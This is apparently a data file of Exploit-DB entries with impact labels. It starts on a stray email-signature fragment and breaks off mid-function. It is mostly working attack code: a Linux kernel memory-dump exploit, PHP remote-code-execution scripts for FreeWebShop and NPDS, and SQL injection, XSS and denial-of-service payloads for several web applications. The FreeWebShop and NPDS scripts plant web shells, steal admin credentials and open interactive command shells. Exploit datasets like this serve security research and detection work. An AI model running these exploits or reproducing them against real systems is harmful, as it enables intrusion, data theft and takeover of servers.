(0)1 58 37 03 72 hdau@deloitte.fr<mailto:hdau@deloitte.fr> | www.deloitte.fr<www.deloitte.com>  Avant d'imprimer, pensez à l'environnement",file,0
32271,"NewsHOWLER 1.03 - Cookie Data SQL Injection source: https://www.securityfocus.com/bid/30732/info  NewsHOWLER is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.   javascript:document.cookie = ""news_user=zz'+union+select+3,3,3,3+from+news_users/*; path=/""; javascript:document.cookie = ""news_password=3; path=/"";","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
24043,"Linux Kernel 2.5.x/2.6.x - CPUFreq Proc Handler Integer Handling Memory Read /* source: https://www.securityfocus.com/bid/10201/info  A local integer handling vulnerability has been announced in the Linux kernel. It is reported that this vulnerability may be exploited by an unprivileged local user to obtain kernel memory contents. Additionally it is reported that a root user may exploit this issue to write to arbitrary regions of kernel memory, which may be a vulnerability in non-standard security enhanced systems where uid 0 does not have this privilege.  The vulnerability presents itself due to integer handling errors in the proc handler for cpufreq. */  /*  *  *  /proc ppos kernel memory read (semaphore method)  *  *  gcc -O3 proc_kmem_dump.c -o proc_kmem_dump  *  *  Copyright (c) 2004  iSEC Security Research. All Rights Reserved.  *  *  THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED ""AS IS""  *  AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION  *  WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.  *  */   #define _GNU_SOURCE  #include <stdio.h> #include <stdlib.h> #include <signal.h> #include <string.h> #include <errno.h> #include <unistd.h> #include <fcntl.h> #include <time.h> #include <sched.h>  #include <sys/socket.h> #include <sys/select.h> #include <sys/time.h> #include <sys/mman.h>  #include <linux/unistd.h>  #include <asm/page.h>   //  define machine mem size in MB #define MEMSIZE 64    _syscall5(int, _llseek, uint, fd, ulong, hi, ulong, lo, loff_t *, res,           uint, wh);    void fatal(const char *msg) {     printf(""0);     if(!errno) {         fprintf(stderr, ""FATAL ERROR: %s0, msg);     }     else {         perror(msg);     }      printf(""0);     fflush(stdout);     fflush(stderr);     exit(31337); }   static int cpid, nc, fd, pfd, r=0, i=0, csize, fsize=1024*1024*MEMSIZE,            size=PAGE_SIZE, us; static volatile int go[2]; static loff_t off; static char *buf=NULL, *file, child_stack[PAGE_SIZE]; static struct timeval tv1, tv2; static struct stat st;   //  child close sempahore & sleep int start_child(void *arg) { //  unlock parent & close semaphore     go[0]=0;     madvise(file, csize, MADV_DONTNEED);     madvise(file, csize, MADV_SEQUENTIAL);     gettimeofday(&tv1, NULL);     read(pfd, buf, 0);      go[0]=1;     r = madvise(file, csize, MADV_WILLNEED);     if(r)         fatal(""madvise"");  //  parent blocked on mmap_sem? GOOD!     if(go[1] == 1 || _llseek(pfd, 0, 0, &off, SEEK_CUR)<0 ) {         r = _llseek(pfd, 0x7fffffff, 0xffffffff, &off, SEEK_SET);             if( r == -1 )                 fatal(""lseek"");         printf(""0 Race won!""); fflush(stdout);         go[0]=2;     } else {         printf(""0 Race lost %d, use another file!0, go[1]);         fflush(stdout);         kill(getppid(), SIGTERM);     }     _exit(1);  return 0; }  void usage(char *name) {     printf(""0SAGE: %s <file not in cache>"", name);     printf(""0);     exit(1); }   int main(int ac, char **av) {     if(ac<2)         usage(av[0]);  //  mmap big file not in cache     r=stat(av[1], &st);     if(r)         fatal(""stat file"");     csize = (st.st_size + (PAGE_SIZE-1)) & ~(PAGE_SIZE-1);      fd=open(av[1], O_RDONLY);     if(fd<0)         fatal(""open file"");     file=mmap(NULL, csize, PROT_READ, MAP_SHARED, fd, 0);     if(file==MAP_FAILED)         fatal(""mmap"");     close(fd);     printf(""0 mmaped uncached file at %p - %p"", file, file+csize);     fflush(stdout);      pfd=open(""/proc/mtrr"", O_RDONLY);     if(pfd<0)         fatal(""open"");      fd=open(""kmem.dat"", O_RDWR|O_CREAT|O_TRUNC, 0644);     if(fd<0)         fatal(""open data"");      r=ftruncate(fd, fsize);     if(r<0)         fatal(""ftruncate"");      buf=mmap(NULL, fsize, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);     if(buf==MAP_FAILED)         fatal(""mmap"");     close(fd);     printf(""0 mmaped kernel data file at %p"", buf);     fflush(stdout);  //  clone thread wait for child sleep     nc = nice(0);     cpid=clone(&start_child, child_stack + sizeof(child_stack)-4,            CLONE_FILES|CLONE_VM, NULL);     nice(19-nc);     while(go[0]==0) {         i++;     }   //  try to read & sleep & move fpos to be negative     gettimeofday(&tv1, NULL);     go[1] = 1;     r = read(pfd, buf, size );     go[1] = 2;     gettimeofday(&tv2, NULL);     if(r<0)         fatal(""read"");     while(go[0]!=2) {         i++;     }      us = tv2.tv_sec - tv1.tv_sec;     us *= 1000000;     us += (tv2.tv_usec - tv1.tv_usec) ;      printf(""0 READ %d bytes in %d usec"", r, us); fflush(stdout);     r = _llseek(pfd, 0, 0, &off, SEEK_CUR);     if(r < 0 ) {         printf(""0 SUCCESS, lseek fails, reading kernel mem...0);         fflush(stdout);         i=0;         for(;;) {             r = read(pfd, buf, PAGE_SIZE );             if(r!=PAGE_SIZE)                 break;             buf += PAGE_SIZE;             i++;        PAGE %6d"", i); fflush(stdout);             printf(""         }         printf(""0 done, err=%s"", strerror(errno) );         fflush(stdout);     }     close(pfd);      printf(""0);     sleep(1);     kill(cpid, 9);  return 0; }",obtain kernel memory contents,1
46926,"Cyberoam Transparent Authentication Suite 2.1.2.5 - 'NetBIOS Name' Denial of Service (PoC) #Exploit Title: Cyberoam Transparent Authentication Suite 2.1.2.5 - 'NetBIOS Name' Denial of Service (PoC) #Discovery by: Victor Mondragón #Discovery Date: 2019-05-23 #Vendor Homepage: https://www.cyberoam.com #Software Link: https://download.cyberoam.com/solution/optionals/i18n/CTAS%202.1.2.5%20Release.zip #Tested Version: 2.1.2.5 #Tested on: Windows 7 Service Pack 1 x64  #Steps to produce the crash: #1.- Run python code: ctas_nn_2.1.2.5.py #2.- Open ctas_nn_2.1.2.5.txt and copy content to clipboard #3.- Open Cyberoam Transparent Authentication Suite #4.- Select General > in Domain Type select ""Microsoft Active Directory"" #5.- In ""NetBIOS Name"" Paste Clipboard #6.- Click on ""Apply"" #7.- Crashed!   cod = ""\x41"" * 1500  f = open('ctas_nn_2.1.2.5.txt', 'w') f.write(cod) f.close()",crash,1
18121,"FreeWebShop 2.2.9 R2 - 'ajax_save_name.php' Remote Code Execution <?php  /*     --------------------------------------------------------------------------     FreeWebshop <= 2.2.9 R2 (ajax_save_name.php) Remote Code Execution Exploit     --------------------------------------------------------------------------          author.............: Egidio Romano aka EgiX     mail...............: n0b0d13s[at]gmail[dot]com     software link......: http://www.freewebshop.org/          +-------------------------------------------------------------------------+     | This proof of concept code was written for educational purpose only.    |     | Use it at your own risk. Author will be not responsible for any damage. |     +-------------------------------------------------------------------------+          [-] vulnerable code in /addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_save_name.php          37.            @ob_start();     38.            include_once(CLASS_SESSION_ACTION);     39.            $sessionAction = new SessionAction();             40.            $selectedDocuments = $sessionAction->get();     41.            if(removeTrailingSlash($sessionAction->getFolder()) == getParentPath($_POST['id']) && sizeof($selectedDocuments))     42.            {     43.                if(($key = array_search(basename($_POST['id']), $selectedDocuments)) !== false)     44.                {     45.                    $selectedDocuments[$key] = $_POST['value'];     46.                    $sessionAction->set($selectedDocuments);     47.                         48.                }     49.                echo basename($_POST['id']) . ""\n"";     50.                displayArray($selectedDocuments);     51.                     52.            }elseif(removeTrailingSlash($sessionAction->getFolder()) == removeTrailingSlash($_POST['id']))     53.            {     54.                $sessionAction->setFolder($_POST['id']);     55.            }     56.            writeInfo(ob_get_clean());          An attacker could be able to manipulate the $selectedDocuments array that will be displayed at line 50,     then at line 56 is called the 'writeInfo' function using the current buffer contents as argument.     Like my recently discovered vulnerability (http://www.exploit-db.com/exploits/18075/), this function     writes into a file called 'data.php' so an attacker could be able to execute arbitrary PHP code.      [-] Disclosure timeline:          [24/10/2011] - Vulnerability discovered     [25/10/2011] - Issue reported to http://www.freewebshop.org/forum/?topic=5235     [15/11/2011] - After three weeks still no fix released     [16/11/2011] - Public disclosure  */  error_reporting(0); set_time_limit(0); ini_set(""default_socket_timeout"", 5);  function http_send($host, $packet) {     if (!($sock = fsockopen($host, 80)))         die( ""\n[-] No response from {$host}:80\n"");      fwrite($sock, $packet);     return stream_get_contents($sock); }  function random_mkdir() {     global $host, $path;          $dirname = uniqid();          $payload = ""new_folder={$dirname}&currentFolderPath=../../../up/"";     $packet  = ""POST {$path}addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n"";     $packet .= ""Host: {$host}\r\n"";     $packet .= ""Content-Length: "".strlen($payload).""\r\n"";     $packet .= ""Content-Type: application/x-www-form-urlencoded\r\n"";     $packet .= ""Connection: close\r\n\r\n{$payload}"";          http_send($host, $packet);         return $dirname; }  print ""\n+---------------------------------------------------------------+""; print ""\n| FreeWebshop <= 2.2.9 R2 Remote Code Execution Exploit by EgiX |""; print ""\n+---------------------------------------------------------------+\n"";  if ($argc < 3) {     print ""\nUsage......: php $argv[0] <host> <path>\n"";     print ""\nExample....: php $argv[0] localhost /"";     print ""\nExample....: php $argv[0] localhost /freewebshop/\n"";     die(); }  $host = $argv[1]; $path = $argv[2];  $phpcode = ""<?php error_reporting(0);print(___);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>"";  $payload = ""selectedDoc[]={$phpcode}&currentFolderPath=../../../up/""; $packet  = ""POST {$path}addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_file_cut.php HTTP/1.0\r\n""; $packet .= ""Host: {$host}\r\n""; $packet .= ""Content-Length: "".strlen($payload).""\r\n""; $packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; $packet .= ""Connection: close\r\n\r\n{$payload}"";  if (!preg_match(""/Set-Cookie: ([^;]*);/"", http_send($host, $packet), $sid)) die(""\n[-] Session ID not found!\n"");  $dirname = random_mkdir(); $newname = uniqid();  $payload = ""value={$newname}&id=../../../up/{$dirname}""; $packet  = ""POST {$path}addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/ajax_save_name.php HTTP/1.0\r\n""; $packet .= ""Host: {$host}\r\n""; $packet .= ""Cookie: {$sid[1]}\r\n""; $packet .= ""Content-Length: "".strlen($payload).""\r\n""; $packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; $packet .= ""Connection: close\r\n\r\n{$payload}"";  http_send($host, $packet);  $packet  = ""GET {$path}addons/tinymce/jscripts/tiny_mce/plugins/ajaxfilemanager/inc/data.php HTTP/1.0\r\n""; $packet .= ""Host: {$host}\r\n""; $packet .= ""Cmd: %s\r\n""; $packet .= ""Connection: close\r\n\r\n"";  while(1) {     print ""\nfreewebshop-shell# "";     if (($cmd = trim(fgets(STDIN))) == ""exit"") break;     $response = http_send($host, sprintf($packet, base64_encode($cmd)));     preg_match(""/___(.*)/s"", $response, $m) ? print $m[1] : die(""\n[-] Exploit failed!\n""); }  ?>",execute arbitrary PHP code,1
41997,"CMS Made Simple 2.1.6 - Multiple Vulnerabilities # Title:             CMSMS 2.1.6 Multiple Vulnerabilities # Date:              10-05-2017 # Tested on:         Windows 8 64-bit # Exploit Author:    Osanda Malith Jayathissa (@OsandaMalith) # Original write-up: https://osandamalith.com/2017/05/11/cmsms-2-1-6-multiple-vulnerabilities/ # CVE: CVE-2017-8912  Remote Code Execution ======================  POST /cmsms/admin/editusertag.php?_sk_=2a7da2216d41e0ac&userplugin_id=4 HTTP/1.1  _sk_=2a7da2216d41e0ac&userplugin_id=4&userplugin_name=aaa&code=passthru('dir')%3B&description=&run=1&apply=1&ajax=1    Stored XSS  ==========  POST /cmsms/admin/addgroup.php HTTP/1.1  _sk_=92a32a8aaa87e958&group=%3Csvg%2Fonload%3Dalert%282%29%3E&description=%22%3E%3Csvg%2Fonload%3Dalert%283%29%3E&active=on&addgroup=true   Disclosure Timeline ====================  09-05-2017: Reported to the vendor 09-05-2017: Vendor doesn't accept XSS issues inside admin panel and claimed the RCE as a feature, not a bug :) 10-05-2017: Public disclosure 11-05-2017: Assigned CVE-2017-8912",Code Execution,1
39239,"xClassified - 'ads.php' SQL Injection source: https://www.securityfocus.com/bid/68438/info  xClassified is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  xClassified 1.2 is vulnerable; other versions may also be affected.   http://www.example.com/ads.php?catid=4%27a[SQLi]","compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database",1
4990,"phpIP 4.3.2 - Multiple SQL Injections There exist numerous SQL injection vulnerabilities in phpIP 4.3.2, and probably previous versions. Most of the data obtained from the request variables ($_GET, $_POST, $_COOKIE, etc) is not sanitized before it is passed to MySQL. This may result in un-authorized administrative access to phpIp and read-access to the database, among other things.  One such vulnerability allows an attacker to gain administrative access to the application, this does not require the attacker to already have access to an existing user account.  Proof of concept: Go to the phpIP login page and enter a valid username ('phpip' typically works, if not try 'admin') with the following password:  a') UNION SELECT 1,1,'Administrator',1,1,1,1,1 #  At this point you will be logged in as an Administrator with the supplied username.  There is also the risk of information disclosure through another SQL injection vulnerability found in display.php. The following PoC demonstrates a query that will echo a userid, username, MD5-hashed password, and email address to the page. You must be logged in to take advantage of this vulnerability (see above.)  Proof of concept: http(s)://path/to/phpip/display.php?range=view&id=0%20UNION%20SELECT%20null,null,null,null,null,null,uid,username,password,email,null,null,null,null,null,null,null,null,null,null%20%20FROM%20users--&iprange=0&netid=0  # milw0rm.com [2008-01-26]",information disclosure,1
3505,"Net Portal Dynamic System (NPDS) 5.10 - Remote Code Execution (1) #!/usr/bin/php <?php error_reporting(E_ALL ^ E_NOTICE);  # Advisory soon if($argc < 3) { print(""   TITLE | Net Portal Dynamic System (NPDS) <= 5.10 Remote Code Execution 0day  AUTHOR | DarkFig \/ http://www.acid-root.new.fr \/ gmdarkfig@gmail.com    NOTE | Works regardless of php settings   USAGE | $argv[0] -url <url> [Options] OPTIONS | -proxy     If you wanna use a proxy <proxyhost:proxyport>          | -proxyauth Basic authentification <proxyuser:proxypwd> "");exit(1); }  $url = getparam('url',1); $pro = getparam('proxy'); $pra = getparam('proyauth');  $xpl = new phpsploit(); $xpl->agent('Mozilla Firefox'); if($pro) $xpl->proxy($pro); if($pra) $xpl->proxyauth($pra);   # +print.php (SQL INJECTION) # | # 124. } elseif (!empty($lid)) { # 125.  settype ($lid, ""integer""); # 126.  PrintPage(""links"",$DB, $lid); #  # 30.  if ($oper==""links"") { # 31.  $result=mysql_query(""select url, title, description, date from "".$DB.""links_links where lid='$sid'""); # 32.  list($url, $title, $description, $time)=mysql_fetch_row($result); # 40.  if ($DB) { # 41.  $remp=meta_lang(aff_code(aff_langue(ob_get_contents()))); # $aid = 'CONCAT(CHAR(66,69,71,73,78,85,83,82),(SELECT%20aid%20FROM%20authors%20WHERE%20radminsuper=1),CHAR(69,78,68,85,83,82))'; $pwd = 'CONCAT(CHAR(66,69,71,73,78,80,87,68),(SELECT%20pwd%20FROM%20authors%20WHERE%20radminsuper=1),CHAR(69,78,68,80,87,68))';   # +grab_globals.php (VARS OVERWRITE / ""url_protect"" FILTER EVASION) # | # 78.  if (!empty($_GET)) { # 79.  if (!$magicquotesGPC) # 80.  array_walk($_GET,'addslashes_GPC'); # 81.  reset($_GET); # 82.  array_walk($_GET,'url_protect'); # 83.  extract($_GET, EXTR_OVERWRITE); #        # 106. if (!empty($_COOKIE)) { # 107. if (!$magicquotesGPC) # 108. array_walk($_COOKIE,'addslashes_GPC'); # 109. reset($_COOKIE); # 110. array_walk($_COOKIE,'url_protect'); # 111. extract($_COOKIE, EXTR_OVERWRITE); #        # 132. if (!empty($_FILES)) { # 133. while (list($key,$value)=each($_FILES)) { # 134. $$key=$value['tmp_name']; # 135. } # $xpl->get($url.""print.php?_FILES[DB][tmp_name]=links_links%20union%20select%20-1,$aid,$pwd,1%20ORDER%20BY%20url%23&lid=1"");  if (preg_match(""#BEGINUSR(.*)ENDUSR#"",$xpl->getcontent(),$aid) AND preg_match(""#BEGINPWD(.*)ENDPWD#"",$xpl->getcontent(),$pwd)) print ""\nAdmin_aid: $aid[1]\nAdmin_pwd: $pwd[1]""; else die(""Exploit failed"");  # +auth.inc.php (ADMIN AUTH) # | # 59. if ($admin!="""") { # 60.  $Xadmin = base64_decode($admin); # 61.  $Xadmin = explode("":"", $Xadmin); # 62.  $aid = urlencode($Xadmin[0]); # 63.  $AIpwd = $Xadmin[1]; # 64.  if ($aid=="""" or $AIpwd=="""") { # 65.     Admin_Alert(""Null Aid or Passwd""); # 66.  } # 67. $result=mysql_query(""select pwd, radminsuper from authors where aid='$aid'""); # 68. if (!$result) { # 69.     Admin_Alert(""DB not ready #2 : $aid / $AIpwd | ""); # 70.  } else { # 71.    list($AIpass, $Xsuper_admintest)=mysql_fetch_row($result); # 72.    if (md5($AIpass) == $AIpwd and $AIpass != """") { # 73.       $admintest = true; # 74.       $super_admintest = $Xsuper_admintest; # 75.    } else { # 76.       Admin_Alert(""Password in Cookies not Good #1 : $aid / $AIpwd | ""); # 77.    } # 78.  } # 79.  unset ($AIpass); # 80.  unset ($AIpwd); # 81.  unset ($Xadmin); # 82.  unset ($Xsuper_admintest); # 83. } # $cok = urlencode(base64_encode($aid[1].':'.md5($pwd[1]))); $xpl->addcookie('admin',$cok); print ""\nAdmin_cookie: admin=$cok\n\$shell> "";   # +admin/settings.php (CODE EXECUTION) # | # 758. switch($op) { # 763. case ""ConfigSave"": # 764. include(""admin/settings_save.php""); # 765. ConfigSave($xparse,$xsitename,$xnuke_url,$xsite_logo,$xslogan,$xstartdate,$xadminmail, #      $xtop,$xstoryhome,$xoldnum,$xultramode,$xanonpost,$xDefault_Theme,$xbanners,$xmyIP, #      $xfoot1,$xfoot2,$xfoot3,$xfoot4,$xbackend_title,$xbackend_language,$xbackend_image, #      $xbackend_width,$xbackend_height,$xlanguage,$xlocale,$xperpage,$xpopular,$xnewlinks, #      $xtoplinks,$xlinksresults,$xlinks_anonaddlinklock,$xnotify,$xnotify_email,$xnotify_subject, #      $xnotify_message,$xnotify_from,$xmoderate,$xcommentlimit,$xanonymous,$xmaxOptions,$xBarScale, #      $xsetCookies,$xtipath,$xuserimg,$xadminimg,$xadmingraphic,$xsite_font,$xadmart,$xminpass, #      $xhttpref,$xhttprefmax,$xpollcomm,$xlinkmainlogo,$xstart_page,$xsmilies,$xOnCatNewLink, #      $xEmailFooter,$xshort_user,$xgzhandler,$xrss_host_verif,$xcache_verif,$xmember_list, #      $xdownload_cat,$xmod_admin_news,$xgmt,$xAutoRegUser,$xTitlesitename,$xfilemanager, #      $xshort_review,$xnot_admin_count,$xadmin_cook_duration,$xuser_cook_duration,$xtroll_limit, #      $xsubscribe,$xCloseRegUser,$xshort_menu_admin,$xmail_fonction,$xmemberpass,$xshow_user, #      $xdns_verif,$xmember_invisible,$xavatar_size,$xlever,$xcoucher,$xmulti_langue,$xadmf_ext, #      $xsavemysql_size,$xsavemysql_mode,$xtiny_mce); # 766. break; # 767. } # # +admin/settings_save.php # | # 142. function ConfigSave(... # 212. $file = fopen(""config.php"",""w""); # 401. $content .= ""\$perpage = $xperpage;\n""; # 402. $content .= ""\$popular = $xpopular;\n"";... # 614. fwrite($file, $content); # 615. fclose($file); # $PHPCODE = 'if(isset($_SERVER[HTTP_REFERER])) eval($_SERVER[HTTP_REFERER])';   # Default config value # You can get the config here ./admin.php?op=Configure # $config = array( frmdt_url => $url.'admin.php',""xparse"" => ""1"",""xgzhandler"" => ""0"",""xfilemanager"" => ""0"",""xadmin_cook_duration"" => ""240"", ""xuser_cook_duration"" => ""8000"",""xsitename"" => ""NPDS SABLE"",""xTitlesitename"" => ""NPDS - générateur de portail Php / Mysql en Open Source"", ""xnuke_url"" => ""http://www.npds.org"",""xsite_logo"" => ""themes/Permanent-Double-Side/images/npds_p.gif"",""xslogan"" => ""NPDS SABLE"", ""xstartdate"" => ""01/10/2005"",""xtop"" => ""10;$PHPCODE"",""xstoryhome"" => ""10"",""xoldnum"" => ""10"",""xultramode"" => ""1"",""xanonymous"" => ""Anonyme"", ""xanonpost"" => ""0"",""xtroll_limit"" => ""6"",""xmod_admin_news"" => ""0"",""xnot_admin_count"" => ""1"",""xDefault_Theme"" => ""Permanent-Double-Side"", ""xstart_page"" => ""index.php?op=edito"",""xlanguage"" => ""french"",""xmulti_langue"" => ""false"",""xlocale"" => ""french"",""xlever"" => ""08:00"", ""xcoucher"" => ""20:00"",""xgmt"" => """",""xbanners"" => ""0"",""xmyIP"" => ""1.1.1.100"",""xfoot4"" => """",""xbackend_title"" => ""NPDS"",""xbackend_language"" => ""fr-FR"", ""xfoot1"" => ""Tous les Logos et Marques sont déposés, les commentaires sont sous la responsabilité de ceux qui les ont publiés, le reste @ npds.org"", ""xfoot2"" => ""Ce site a été construit avec <a href=http://www.npds.org CLASS=NOIR>NPDS</a>, un système de portail écrit en PHP. Ce logiciel est sous <a href=http://www.gnu.org CLASS=NOIR>GNU/GPL license</a>."", ""xfoot3"" => ""syndication de vos News via <a href=http://www.votre_site/backend.php CLASS=NOIR>www.votre_site/backend.php</a> -::- + encore via le NPDS Push Infos System"", ""xbackend_image"" => """",""xbackend_width"" => ""88"",""xbackend_height"" => ""31"",""xperpage"" => ""10"",""xpopular"" => ""10"",""xnewlinks"" => ""10"", ""xtoplinks"" => ""10"",""xlinksresults"" => ""10"",""xlinks_anonaddlinklock"" => ""0"",""xlinkmainlogo"" => ""0"",""xOnCatNewLink"" => ""1"", ""xadminmail"" => """",""xmail_fonction"" => ""1"",""xEmailFooter"" => """",""xnotify"" => ""0"",""xnotify_email"" => ""membre@site.fr"",""xnotify_subject"" => ""Nouvelle soumission"", ""xnotify_message"" => ""Le site a recu une nouvelle soumission !"",""xnotify_from"" => ""webmaster"",""xmoderate"" => ""1"",""xcommentlimit"" => ""4096"", ""xmaxOptions"" => ""12"",""xBarScale"" => ""1"",""xsetCookies"" => ""1"",""xpollcomm"" => ""1"",""xtipath"" => ""themes/Permanent-Double-Side/images/topics/"", ""xuserimg"" => ""/themes/Permanent-Double-Side/images/menu/"",""xadminimg"" => ""images/admin/"",""xadmingraphic"" => ""0"",""xadmf_ext"" => ""gif"", ""xshort_menu_admin"" => ""1"",""xsite_font"" => ""Verdana, Arial, Helvetica"",""xadmart"" => ""10"",""xminpass"" => ""5"",""xshow_user"" => ""20"",""xsmilies"" => ""1"", ""xavatar_size"" => ""60*80"",""xshort_user"" => ""0"",""xAutoRegUser"" => ""1"",""xmemberpass"" => ""1"",""xsubscribe"" => ""1"",""xmember_invisible"" => ""0"", ""xCloseRegUser"" => ""0"",""xhttpref"" => ""1"",""xhttprefmax"" => ""1000"",""xmember_list"" => ""0"",""xdownload_cat"" => ""Tous"",""xshort_review"" => ""0"", ""xrss_host_verif"" => ""false"",""xcache_verif"" => ""true"",""xdns_verif"" => ""false"",""xsavemysql_size"" => ""256"",""xsavemysql_mode"" => ""1"", ""xtiny_mce"" => ""true"",""op"" => ""ConfigSave"");  # 0_o my website has been reset # $xpl->formdata($config);  while(!preg_match(""#^(quit|exit)$#"",($cmd = trim(fgets(STDIN)))))  # $cmd -> );print($dbpass);// {     $xpl->addheader(""Referer"",""@system($cmd);die;"");     $xpl->get($url.'config.php');     print $xpl->getcontent().""\n\$shell> ""; }  function getparam($param,$opt='') { 	global $argv; 	foreach($argv as $value => $key) 	{ 		if($key == '-'.$param) return $argv[$value+1]; 	} 	if($opt) exit(""\n-$param parameter required""); 	else return; }  /*  *   * Copyright (C) darkfig  *   * This program is free software; you can redistribute it and/or   * modify it under the terms of the GNU General Public License   * as published by the Free Software Foundation; either version 2   * of the License, or (at your option) any later version.   *   * This program is distributed in the hope that it will be useful,   * but WITHOUT ANY WARRANTY; without even the implied warranty of   * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the   * GNU General Public License for more details.   *   * You should have received a copy of the GNU General Public License   * along with this program; if not, write to the Free Software   * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.  *   * TITLE:          PhpSploit Class  * REQUIREMENTS:   PHP 5 (remove ""private"", ""public"" if you have PHP 4)  * VERSION:        1.2  * LICENSE:        GNU General Public License  * ORIGINAL URL:   http://www.acid-root.new.fr/tools/03061230.txt  * FILENAME:       phpsploitclass.php  *  * CONTACT:        gmdarkfig@gmail.com (french / english)  * GREETZ:         Sparah, Ddx39  *  * DESCRIPTION:  * The phpsploit is a class implementing a web user agent.  * You can add cookies, headers, use a proxy server with (or without) a  * basic authentification. It supports the GET and the POST method. It can  * also be used like a browser with the cookiejar() function (which allow  * a server to add several cookies for the next requests) and the  * allowredirection() function (which allow the script to follow all  * redirections sent by the server). It can return the content (or the  * headers) of the request. Others useful functions can be used for debugging.  * A manual is actually in development but to know how to use it, you can  * read the comments.  *  * CHANGELOG:  * [2007-01-24] (1.2)  *  * Bug #2 fixed: Problem concerning the getcookie() function ((|;))  *  * New: multipart/form-data enctype is now supported   *  * [2006-12-31] (1.1)  *  * Bug #1 fixed: Problem concerning the allowredirection() function (chr(13) bug)  *  * New: You can now call the getheader() / getcontent() function without parameters  *  * [2006-12-30] (1.0)  *  * First version  *   */  class phpsploit {  	/** 	 * This function is called by the get()/post() functions. 	 * You don't have to call it, this is the main function. 	 * 	 * @return $server_response 	 */ 	private function sock() 	{ 		if(!empty($this->proxyhost) && !empty($this->proxyport)) $socket = fsockopen($this->proxyhost,$this->proxyport); 		else $socket = fsockopen($this->host,$this->port); 		 		if(!$socket) die(""Error: The host doesn't exist""); 		 		if($this->method===""get"") $this->packet = ""GET "".$this->url."" HTTP/1.1\r\n""; 		elseif($this->method===""post"" or $this->method===""formdata"") $this->packet = ""POST "".$this->url. "" HTTP/1.1\r\n""; 		else die(""Error: Invalid method""); 		 		if(!empty($this->proxyuser)) $this->packet .= ""Proxy-Authorization: Basic "".base64_encode($this->proxyuser."":"".$this->proxypass).""\r\n""; 		$this->packet .= ""Host: "".$this->host.""\r\n""; 		 		if(!empty($this->agent))  $this->packet .= ""User-Agent: "".$this->agent.""\r\n""; 		if(!empty($this->header)) $this->packet .= $this->header.""\r\n""; 		if(!empty($this->cookie)) $this->packet .= ""Cookie: "".$this->cookie.""\r\n""; 		 		$this->packet .= ""Connection: Close\r\n""; 		if($this->method===""post"") 		{ 			$this->packet .= ""Content-Type: application/x-www-form-urlencoded\r\n""; 			$this->packet .= ""Content-Length: "".strlen($this->data).""\r\n\r\n""; 			$this->packet .= $this->data.""\r\n""; 		} 		elseif($this->method===""formdata"") 		{ 			$this->packet .= ""Content-Type: multipart/form-data; boundary=---------------------------"".$this->boundary.""\r\n""; 			$this->packet .= ""Content-Length: "".strlen($this->data).""\r\n\r\n""; 			$this->packet .= $this->data; 		} 		$this->packet .= ""\r\n""; 		$this->recv = ''; 		 		fputs($socket,$this->packet); 		while(!feof($socket)) $this->recv .= fgets($socket); 		fclose($socket); 		 		if($this->cookiejar) $this->cookiejar($this->getheader($this->recv)); 		if($this->allowredirection) return $this->allowredirection($this->recv); 		else return $this->recv; 	} 	  	/** 	 * This function allows you to add several cookie in the 	 * request. Several methods are supported: 	 *  	 * $this->addcookie(""name"",""value""); 	 * or 	 * $this->addcookie(""name=newvalue""); 	 * or 	 * $this->addcookie(""othername=overvalue; xx=zz; y=u""); 	 *  	 * @param string $cookiename 	 * @param string $cookievalue 	 *  	 */ 	public function addcookie($cookn,$cookv='') 	{ 		// $this->addcookie(""name"",""value""); work avec replace 		if(!empty($cookv)) 		{ 			if($cookv === ""deleted"") $cookv=''; // cookiejar(1) && Set-Cookie: name=delete 			if(!empty($this->cookie)) 			{ 			    if(preg_match(""/$cookn=/"",$this->cookie)) 			    { 			    	$this->cookie = preg_replace(""/$cookn=(\S*);/"",""$cookn=$cookv;"",$this->cookie); 			    } 			    else 			    { 			    	$this->cookie .= "" "".$cookn.""="".$cookv."";""; // "" "". 			    } 			} 			else 			{ 				$this->cookie = $cookn.""="".$cookv."";""; 			} 		} 		// $this->addcookie(""name=value; othername=othervalue""); 		else 		{ 	    	 if(!empty($this->cookie)) 	    	 { 	    	 	$cookn = preg_replace(""/(.*);$/"",""$1"",$cookn); 	    	 	$cookarr = explode("";"",str_replace("" "", """",$cookn)); 	    	 	for($i=0;$i<count($cookarr);$i++) 	    	 	{ 	    	 		preg_match(""/(\S*)=(\S*)/"",$cookarr[$i],$matches); 	    	 		$cookn = $matches[1]; 	    	 		$cookv = $matches[2]; 	    	 		$this->addcookie($cookn,$cookv); 	    	 	} 	    	 } 			 else 			 { 			 	$cookn = ((substr($cookn,(strlen($cookn)-1),1))==="";"") ? $cookn : $cookn."";""; 			 	$this->cookie = $cookn;			 			 } 		} 	} 	 	 	/** 	 * This function allows you to add several headers in the 	 * request. Several methods are supported: 	 * 	 * $this->addheader(""headername"",""headervalue""); 	 * or 	 * $this->addheader(""headername: headervalue""); 	 * 	 * @param string $headername 	 * @param string $headervalue 	 */ 	public function addheader($headern,$headervalue='') 	{ 		// $this->addheader(""name"",""value""); 		if(!empty($headervalue)) 		{ 			if(!empty($this->header)) 			{ 				if(preg_match(""/$headern:/"",$this->header)) 				{ 					$this->header = preg_replace(""/$headern: (\S*)/"",""$headern: $headervalue"",$this->header); 				} 				else 				{ 					$this->header .= ""\r\n"".$headern."": "".$headervalue; 				} 			} 			else 			{ 			